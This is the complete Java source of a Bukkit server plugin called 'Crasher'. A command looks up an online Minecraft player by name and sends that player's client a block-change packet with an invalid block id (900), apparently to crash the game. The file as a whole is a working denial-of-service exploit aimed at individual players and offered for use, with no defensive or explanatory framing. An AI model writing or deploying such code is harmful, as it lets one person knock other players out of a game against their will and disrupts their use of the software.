package me.jtjj222.crasher;

import java.util.ArrayList;

import net.minecraft.server.v1_4_6.EntityPlayer;
import net.minecraft.server.v1_4_6.Packet53BlockChange;

import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_4_6.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public class Crasher extends JavaPlugin {

	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
		
		if (args.length == 1) {
			String victimName = args[0];
			
			ArrayList<Player> possibleMatches = new ArrayList<Player>();
			for (Player p : getServer().getOnlinePlayers()) {
				if (p.getName().contains(victimName)) {
					possibleMatches.add(p);
				}
			}
			
			if (possibleMatches.size() != 1) {
				sender.sendMessage("I found more than one player with a similar name.");
				return true;
			}
			else {
				crashPlayer(possibleMatches.get(0));
				return true;
			}
			
		}
		
		System.out.println("You must specify a player name!");
		
		return false;
	}
	
	public void crashPlayer(Player p) {
		EntityPlayer v = ((CraftPlayer) p).getHandle();
		
		Packet53BlockChange deathPacket = new Packet53BlockChange();
		deathPacket.a = (int) p.getLocation().getX();
		deathPacket.b = (int) p.getLocation().getY();
		deathPacket.c = (int) p.getLocation().getZ();
		deathPacket.data = 0;
		deathPacket.material = 900; //invalid block id
		deathPacket.lowPriority = false;
		
		v.playerConnection.sendPacket(deathPacket);
	}
	
}
